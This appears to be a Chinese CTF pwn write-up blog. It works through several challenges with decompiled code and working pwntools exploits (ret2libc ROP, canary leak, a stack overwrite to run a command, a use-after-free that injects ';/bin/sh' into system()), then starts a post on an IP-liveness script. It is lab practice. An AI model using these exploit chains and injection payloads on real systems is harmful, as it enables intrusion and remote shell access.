<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40063D</span><span class="params">(__int64 a1, <span class="keyword">signed</span> <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h] a2==200</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    read(<span class="number">0</span>, (<span class="keyword">void</span> *)(i + a1), <span class="number">1uLL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//a1栈空间大小为0x40，然后就是rbp、rsp</span></span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201208055615.png" alt="20201208055615"><br>
可以看出存在明显的栈溢出，程序内也没有其他特别的sys函数和/bin/sh字符串，所以大概的思路是先查到libc版本，然后构造出system(/bin/sh)</p>
<p>得到exp：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">36759</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./b2&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./b2&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0400763</span></span><br><span class="line">main = <span class="number">0x40068E</span></span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">leak = <span class="string">&quot;a&quot;</span>*<span class="number">0x40</span> + <span class="string">&quot;a&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main) </span><br><span class="line">leak = leak.ljust(<span class="number">200</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.send(leak)</span><br><span class="line">p.recvuntil(<span class="string">&quot;bye~\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))	<span class="comment">#!!!p.recv() will contain a &quot;0a&quot;(\n)</span></span><br><span class="line"></span><br><span class="line">base = puts_addr - <span class="number">0x06f690</span></span><br><span class="line">sys = base + <span class="number">0x045390</span></span><br><span class="line">binsh = base + 	<span class="number">0x18cd57</span></span><br><span class="line">payload = <span class="string">&quot;1&quot;</span>*<span class="number">0x40</span> + <span class="string">&quot;1&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(sys) </span><br><span class="line"></span><br><span class="line">payload = payload.ljust(<span class="number">200</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive() </span><br></pre></td></tr></table></figure>
<p>这题主要是recv puts地址的时候要注意，数据是否截取多了/少了，因为会影响计算别的函数/字符串。<br>
还有就是send和sendline和sendlineafter；recv和recvuntil对程序、执行exp的影响…</p>
<h2 id="pwn1">pwn1</h2>
<p>这题好迷…本地打通，远程打不通；远程打通，本地打不通（换过libc）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">43763</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./babystack&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./babystack&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)# local</span></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so&quot;</span>) <span class="comment">#remote</span></span><br><span class="line">stack = <span class="string">&quot;a&quot;</span>*<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendline(stack)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">canary = u64(p.recv(<span class="number">7</span>).rjust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(canary)</span><br><span class="line"></span><br><span class="line">init = <span class="number">0x00400908</span></span><br><span class="line">pop_rdi = <span class="number">0x0400a93</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"></span><br><span class="line">leak_addr = stack + p64(canary) + <span class="string">&quot;1&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(init)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.send(leak_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)<span class="comment">#????	&amp; rjust||ljust</span></span><br><span class="line"></span><br><span class="line">puts_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">system_addr = 	<span class="number">0x045390</span></span><br><span class="line">binsh_addr = 	<span class="number">0x18cd57</span></span><br><span class="line">offset = puts_addr - libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">system = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = offset + binsh_addr</span><br><span class="line"></span><br><span class="line">payload2 = stack + p64(canary) + <span class="string">&quot;1&quot;</span>*<span class="number">8</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(init)</span><br><span class="line"></span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>就是一个 泄露canary、libc版本的过程。前几天就是这题和上一题，因为sendline/send/sendlineafter之类的问题把我整的怀疑人生…<br>
不想评价</p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vYmh4ZG4vcC8xMjUzMDk0NS5odG1s">https://www.cnblogs.com/bhxdn/p/12530945.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="Recho">Recho</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC84YmViOTBiMjQ5ZDY=">https://www.jianshu.com/p/8beb90b249d6<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vY291bnRmYXRjb2RlL3AvMTIzMjY4MDcuaHRtbA==">https://www.cnblogs.com/countfatcode/p/12326807.html<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYS9hcnRpY2xlL2RldGFpbHMvMTAyOTkyODg3">https://blog.csdn.net/seaaseesa/article/details/102992887<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="secret-file">secret_file</h2>
<p>运行一下：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213143540.png" alt="20201213143540"></p>
<p>checksec：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213142548.png" alt="20201213142548"><br>
x86-64的程序，所有保护都打开了哎…</p>
<p>拖入ida看主函数伪代码如下：(部分函数名经过修饰，并添加注释)</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v4; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">char</span> *v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// er12</span></span><br><span class="line">  FILE *v9; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+0h] [rbp-308h]</span></span><br><span class="line">  <span class="keyword">char</span> *lineptr; <span class="comment">// [rsp+8h] [rbp-300h]</span></span><br><span class="line">  __int64 dest; <span class="comment">// [rsp+10h] [rbp-2F8h]</span></span><br><span class="line">  <span class="keyword">char</span> v14; <span class="comment">// [rsp+110h] [rbp-1F8h] 执行的命令</span></span><br><span class="line">  <span class="keyword">char</span> v15; <span class="comment">// [rsp+12Bh] [rbp-1DDh] dest的sha256</span></span><br><span class="line">  <span class="keyword">char</span> v16; <span class="comment">// [rsp+16Ch] [rbp-19Ch] 参与sha256变换</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// [rsp+18Ch] [rbp-17Ch] 与v15比较</span></span><br><span class="line">  <span class="keyword">char</span> v18; <span class="comment">// [rsp+1CCh] [rbp-13Ch]</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+1D0h] [rbp-138h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v20; <span class="comment">// [rsp+2D8h] [rbp-30h]</span></span><br><span class="line"></span><br><span class="line">  v20 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_E60((<span class="keyword">char</span> *)&amp;dest);                       <span class="comment">// 填充v14和v15</span></span><br><span class="line">  v11 = <span class="number">0LL</span>;</span><br><span class="line">  lineptr = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( getline(&amp;lineptr, (<span class="keyword">size_t</span> *)&amp;v11, <span class="built_in">stdin</span>) == <span class="number">-1</span> )<span class="comment">// 输入，没有限制，回车结束</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  v3 = <span class="built_in">strrchr</span>(lineptr, <span class="string">&#x27;\n&#x27;</span>);                  <span class="comment">// 输入判空</span></span><br><span class="line">  <span class="keyword">if</span> ( !v3 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  *v3 = <span class="number">0</span>;</span><br><span class="line">  v4 = &amp;v16;</span><br><span class="line">  v5 = &amp;v17;</span><br><span class="line">  <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)&amp;dest, lineptr);               <span class="comment">// 辨识度极高的vul_func</span></span><br><span class="line">  sha256_func((__int64)&amp;dest, &amp;v16, <span class="number">0x100</span>u);    <span class="comment">// v16==sha变换后的dest（0x100）</span></span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    v6 = (<span class="keyword">unsigned</span> __int8)*v4;</span><br><span class="line">    v7 = v5;</span><br><span class="line">    v5 += <span class="number">2</span>;</span><br><span class="line">    ++v4;</span><br><span class="line">    <span class="built_in">snprintf</span>(v7, <span class="number">3uLL</span>, <span class="string">&quot;%02x&quot;</span>, v6);             <span class="comment">// 最终目的：把v17填充为hex的v16</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v5 != &amp;v18 );</span><br><span class="line">  v8 = <span class="built_in">strcmp</span>(&amp;v15, &amp;v17);                      <span class="comment">// 比较v15和v17，如果不同就报错</span></span><br><span class="line">  <span class="keyword">if</span> ( v8 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;wrong password!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v9 = popen(&amp;v14, <span class="string">&quot;r&quot;</span>);                        <span class="comment">// 把命令传到binsh执行</span></span><br><span class="line">  <span class="keyword">if</span> ( !v9 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">while</span> ( fgets(&amp;s, <span class="number">256</span>, v9) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, &amp;s);</span><br><span class="line">  fclose(v9);</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>剩下两个子函数不表，功能写在注释里了程序很简短，其中可以马上注意到很熟悉的危险函数strcpy()，再一看发现两个不是很熟悉的函数：getline和popen</p>
<ul>
<li>getline(char **lineptr, size_t *n, FILE *stream):将输入的字符串放入lineptr指向的空间，（如果为NULL则由系统malloc），n:如果是malloc出的则为0，stream：终止符（？）<br>
输入结束的方式为1. 读取字符数达到n，2.遇到函数终止符（\n），3.断开输入</li>
</ul>
<p>可以看到，这里的getline也是一个没有限制输入的危险函数</p>
<ul>
<li>popen：将命令传入/bin/sh中由shell执行，分为输入和输出(w和r)</li>
</ul>
<p>所以我们要做的就是让popen执行get flag 的命令。<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20201213144954.png" alt="20201213144954"><br>
那么首先就要满足这个条件。再一看，发现v17的来源是(hex)v16，v16是经过sha256变换的des。所以想get shell只需要v15==v16<br>
一看栈中变量的分布，发现它们都可以被覆盖呀！！！</p>
<p>所以exp就出来了：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.134&quot;</span>, <span class="number">52529</span>)</span><br><span class="line"></span><br><span class="line">v15 = hashlib.sha256(<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="comment">#p1 = &quot;a&quot;*0x100 + &quot;ls;&quot;.ljust(0x1b, ) + v15 </span></span><br><span class="line">p1 = <span class="string">&quot;a&quot;</span>*<span class="number">0x100</span> + <span class="string">&quot;cat flag.txt;&quot;</span>.ljust(<span class="number">0x1b</span>, ) + v15</span><br><span class="line"><span class="comment">#dest + cmd + sha256</span></span><br><span class="line"></span><br><span class="line">p.sendline(p1)</span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br></pre></td></tr></table></figure>
<p>分两次进行，一次查看目录下的文件，第二次打开.txt文件</p>
<p>over</p>
<h2 id="time-formatter">time_formatter</h2>
<p>接触到的第一个堆漏洞题</p>
<p>首先checksec：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pluto@pluto-virtual-machine:~/Desktop$ checksec 5</span><br><span class="line">[*] <span class="string">&#x27;/home/pluto/Desktop/5&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<blockquote>
<p>（开启了FORTIFY_SOURCE对格式化字符串有两个影响：<br>
1.包含%n的格式化字符串不能位于程序内存中的可写地址。<br>
2.当使用位置参数时，必须使用范围内的所有参数。所以如果要使用%7$x，你必须同时使用1,2,3,4,5和6。）</p>
</blockquote>
<p>运行程序&amp;ida-f5：<br>
主函数是一个选择菜单，修改函数名后如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">      <span class="keyword">switch</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)menu(v4) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1u</span>:</span><br><span class="line">          v5 = set_time_format(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2u</span>:</span><br><span class="line">          v5 = set_time(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3u</span>:</span><br><span class="line">          v5 = set_time_zone();</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4u</span>:</span><br><span class="line">          v5 = print_time(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5u</span>:</span><br><span class="line">          v5 = exit_program(v4, <span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中1和3两个选项对应的函数用到了动态分配的内存，函数2把输入的值放到了bss段</span></span><br><span class="line"><span class="comment">//不同的是函数1对输入进行了判断，函数2没有判断：</span></span><br><span class="line"></span><br><span class="line"><span class="function">_BOOL8 __fastcall <span class="title">sub_400CB5</span><span class="params">(<span class="keyword">char</span> *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> accept; <span class="comment">// [rsp+5h] [rbp-43h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// [rsp+38h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(&amp;accept, <span class="string">&quot;%aAbBcCdDeFgGhHIjklmNnNpPrRsStTuUVwWxXyYzZ:-_/0^# &quot;</span>);</span><br><span class="line">  v3 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strspn</span>(s, &amp;accept) == <span class="built_in">strlen</span>(s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//目前还不知道这个判断有什么作用</span></span><br></pre></td></tr></table></figure>
<p>继续往函数4和5看下去</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">print_time</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> command; <span class="comment">// [rsp+8h] [rbp-810h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+808h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    __snprintf_chk(&amp;command, <span class="number">2048LL</span>, <span class="number">1LL</span>, <span class="number">2048LL</span>, <span class="string">&quot;/bin/date -d @%d +&#x27;%s&#x27;&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_602120, ptr, a3);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your formatted time is: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="keyword">if</span> ( getenv(<span class="string">&quot;DEBUG&quot;</span>) )</span><br><span class="line">      __fprintf_chk(<span class="built_in">stderr</span>, <span class="number">1LL</span>, <span class="string">&quot;Running command: %s\n&quot;</span>, &amp;command);</span><br><span class="line">    setenv(<span class="string">&quot;TZ&quot;</span>, value, <span class="number">1</span>);</span><br><span class="line">    system(&amp;command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You haven&#x27;t specified a format!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">`/bin/date -d @%d +&#x27;%s&#x27;`是一个shell注入。</span></span><br><span class="line"><span class="comment">在命令行中，多个命令可以用分号隔开，执行时会依次运行。我们需要把它构造成：“/bin/data -d @0 + &quot;;/bin/sh&quot;”</span></span><br><span class="line"><span class="comment">但是由于传入的format在输入时就被限制了，所以不能直接通过format就让它执行我们想要的操作</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> __int64 <span class="title">exit_program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+8h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  free_0(ptr);</span><br><span class="line">  free_0(value);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Are you sure you want to exit (y/N)? &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(&amp;s, <span class="number">16</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  result = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( (s &amp; <span class="number">0xDF</span>) == <span class="number">89</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;OK, exiting.&quot;</span>);</span><br><span class="line">    result = <span class="number">1LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//这里，如果执行到函数5，会先释放format和time_zone的内存，然后再询问是否退出。</span></span><br><span class="line"><span class="comment">//但并没有在free之后立刻改变指针指向的位置，造成了uaf漏洞</span></span><br></pre></td></tr></table></figure>
<p>所以大概的思路就有了：</p>
<ol>
<li>先产生一个存放format的空间然后释放，释放后指针F依旧指向这块内存，这块小空间被放在fastbin的头部，下一次分配内存时如果大小合适将首先将它分配出去</li>
<li>进入函数3，输入payload，此时payload将放入原先放置format空间</li>
<li>进入函数4，执行system(“/bin/sh”)，getshell</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;220.249.52.133&quot;</span>, <span class="number">32519</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./5&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mass</span>(<span class="params">ch,data</span>):</span></span><br><span class="line">	p.sendline(ch)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(data)&gt;<span class="number">0</span>:</span><br><span class="line">		p.sendline(data)</span><br><span class="line"></span><br><span class="line">mass(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;a&quot;</span>)</span><br><span class="line">mass(<span class="string">&quot;5&quot;</span>,<span class="string">&quot;N&quot;</span>)</span><br><span class="line">mass(<span class="string">&quot;3&quot;</span>,<span class="string">&#x27;\&#x27;;/bin/sh\&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">mass(<span class="string">&quot;4&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>不知道怎么描述的脚本，用来检测ip存活啥的</title>
    <url>/31550.html</url>
    <content><![CDATA[<p>自用的脚本，正常人应该用不到</p>
<span id="more"></span>
<ul>
<li>解决了：<br>
最近的任务每次都要一个个排查同事给的资产…<br>
不同漏扫工具接受的格式不一样</li>
<li>使用了：<br>
正则<br>
使用socket、ping3和httpx（可用http2.0，某些时候比requests好用一些）进行检测<br>
输出为csv格式</li>
</ul>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> error</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> csv</span><br><span class="line"><span class="keyword">import</span> httpx</span><br><span class="line"><span class="keyword">from</span> ping3 <span class="keyword">import</span> ping, verbose_ping</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url_down = <span class="keyword">lambda</span> url: <span class="built_in">print</span>(<span class="string">&quot;\033[0,33;47m%s 不可访问(URL)\033[0m&quot;</span> % url)</span><br><span class="line">connect_down = <span class="keyword">lambda</span> url: <span class="built_in">print</span>(<span class="string">&quot;\033[0,31;47m%s 不可访问(ping不通)\033[0m&quot;</span> % url)</span><br><span class="line">url_as_200 = <span class="keyword">lambda</span> url: <span class="built_in">print</span>(<span class="string">&quot;\033[0;32;47m%s 可访问(200)\033[0m&quot;</span> % url)</span><br><span class="line">ping_ok = <span class="keyword">lambda</span> url: <span class="built_in">print</span>(<span class="string">&quot;\033[0;32;47m%s 可访问(能ping通）\033[0m&quot;</span> % url)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\target.txt&quot;</span>,<span class="string">&quot;r+&quot;</span>)</span><br><span class="line">awvs = csv.writer(<span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\awvs.csv&quot;</span>,<span class="string">&quot;a&quot;</span>,newline=<span class="string">&quot;&quot;</span>))</span><br><span class="line">nessus = csv.writer(<span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\nessus.csv&quot;</span>,<span class="string">&quot;a&quot;</span>,newline=<span class="string">&quot;&quot;</span>))</span><br><span class="line">Tip = csv.writer(<span class="built_in">open</span>(<span class="string">r&quot;C:\Users\Bruce\Desktop\troubleip.csv&quot;</span>,<span class="string">&quot;a&quot;</span>,newline=<span class="string">&quot;&quot;</span>))</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&#x27;user-agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;accept-language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">client = httpx.Client(http2=<span class="literal">True</span>, verify=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save</span>(<span class="params">ip,port,url</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(url == <span class="string">&quot;&quot;</span> <span class="keyword">and</span> port != <span class="string">&quot;&quot;</span>):</span><br><span class="line">        nessus.writerow([ip+ <span class="string">&quot;:&quot;</span> +port])</span><br><span class="line">        awvs.writerow([ip+ <span class="string">&quot;:&quot;</span> +port])</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">elif</span>(port == <span class="string">&quot;&quot;</span> <span class="keyword">and</span> url == <span class="string">&quot;&quot;</span>):</span><br><span class="line">        nessus.writerow([ip])</span><br><span class="line">        awvs.writerow([ip])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        awvs.writerow([url])</span><br><span class="line">        </span><br><span class="line">        url = url.replace(<span class="string">&quot;https://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        url = url.replace(<span class="string">&quot;http://&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">        url = re.sub( <span class="string">r&#x27;/.*&#x27;</span> , <span class="string">&quot;&quot;</span> , url )</span><br><span class="line">        url = re.sub( <span class="string">r&#x27;:.*&#x27;</span> , <span class="string">&quot;&quot;</span> , url )</span><br><span class="line"></span><br><span class="line">        nessus.writerow([url])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">testip</span>(<span class="params">i</span>):</span></span><br><span class="line">    <span class="comment"># url  去http 和 /</span></span><br><span class="line">    url = i.replace(<span 